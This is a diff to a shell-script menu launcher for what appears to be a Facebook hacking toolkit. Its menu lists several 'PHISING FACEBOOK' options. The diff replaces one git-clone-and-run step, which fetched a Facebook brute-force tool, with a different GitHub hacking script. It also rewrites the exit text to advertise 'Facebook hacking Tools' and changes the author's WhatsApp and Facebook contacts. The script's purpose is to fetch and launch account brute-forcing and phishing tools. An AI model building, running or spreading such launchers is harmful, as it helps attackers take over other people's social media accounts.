@@ -43,7 +43,7 @@ echo $i"|"$me"15"$i" |"$cy" PHISING FACEBOOK 2       "$i"|"$i"    ────�
 echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" K"$i" |"
 echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" E"$i" |"
 echo $i"────────────────────────────────"$i"    |"$cy" R"$i" |"
-echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN DULU COEG  "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me"18"$i" |"$cy" INSTALL ANNY TOOLS       "$i"|"$i"    |"$cy" E"$i" |"
 echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" N"$i" |"
 echo $i"────────────────────────────────    ─────"
 echo
@@ -56,9 +56,9 @@ then
 clear
 figlet -f slant "W A I T"|lolcat
 sleep 1
-git clone https://github.com/FR13ND8/fbbrute
-cd fbbrute
-php fb.php
+git clone https://github.com/Mrbadmash/ahkhacker
+cd ahkhacker
+Python2 afridi.py
 fi
 
 if [ $pil = 2 ]
@@ -251,12 +251,12 @@ then
 clear
 figlet -f slant "E X I T"|lolcat
 sleep 2
-echo $cy"Terima Kasih Sudah Pakai Tool Saya"
+echo $cy"Install any Facebook hacking Tools"
 sleep 2
-echo $i"Bila Ada Kesalahan Kamu Bisa Nanya Kepada Saya"
+echo $i"Anyone who has a problem with commands can ask by joining my Facebook page"
 sleep 2
-echo $ku"WhatsApp :"$i" 085835787069"
-echo $ku"Facebook :"$i" Riski Darmawan"
+echo $ku"WhatsApp :"$i" +923489153973"
+echo $ku"Facebook :"$i" Muhammad Ijaz"
 sleep 2
 echo $pur">> Thanks Yang Sudah Support Saya <<"
 exit
